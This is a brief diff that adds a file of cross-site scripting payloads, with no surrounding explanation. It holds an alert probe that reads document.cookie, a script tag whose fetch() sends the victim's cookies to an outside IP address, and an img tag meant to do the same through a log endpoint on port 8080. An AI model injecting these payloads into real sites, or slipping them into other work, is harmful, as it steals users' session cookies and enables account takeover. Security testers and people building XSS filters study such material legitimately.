@@ -1,0 +1,5 @@
+<script>alert(document.cookie)</script>
+
+<script>fetch('http://153.120.168.59/log?c='+document.cookie+'&pass=12345')</script>
+<img src="http://153.120.168.59:8080/log?c="+document.cookie+"&pass=12345">
+
